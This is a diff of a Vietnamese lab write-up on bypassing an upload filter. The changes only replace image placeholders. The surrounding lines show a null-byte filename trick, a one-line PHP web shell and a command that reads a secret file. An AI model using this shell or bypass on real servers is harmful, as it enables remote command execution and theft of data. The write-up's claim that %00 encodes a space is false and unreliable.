@@ -17,27 +17,27 @@
 -	Kiểm tra xem liệu ta có thể upload và thực thi một file php bằng cách tạo một file tên _test.php_ với nội dung `<?php phpinfo(); ?>` và upload lên server.
 -	Server chỉ cho phép upload file JPG và PNG.
 
-img
+![img3](./img/lab5/img1.png)
 
-img
+![img4](./img/lab5/img2.png)
 
 - Vậy ta có thể upload file để khi lưu trữ, ứng dụng web hiểu đó là một file .jpeg hoặc .png mà khi xử lý file, server lại xử lý như một file .php không?
 - Ta thử upload file với một filename đặc biệt **test.php%00.png** với **%00** là mã hóa URL cho ký tự ' '(khoảng trống)
 
-img
+![img5](./img/lab5/img3.png)
 
  **Kiểm tra giả thuyết**
  - File được upload thành công và có thể thực thi mã PHP.
 
-img
-img
+![img6](./img/lab5/img4.png)
+![img7](./img/lab5/img5.png)
 
 ## 3. Tiến hành khai thác
 - Upload file **shell.test%00.png** để thực hiện đọc tệp tin bí mật với nội dung: `<?php system($_GET['x']) ?>`
 
-img
-img
+![img8](./img/lab5/img6.png)
+![img9](./img/lab5/img7.png)
 
 - Truyền tham số *'x'* để đọc nội dung tệp tin bí mật `x=cat%20/home/carlos/secret`
 
-img
+![img10](./img/lab5/img8.png)
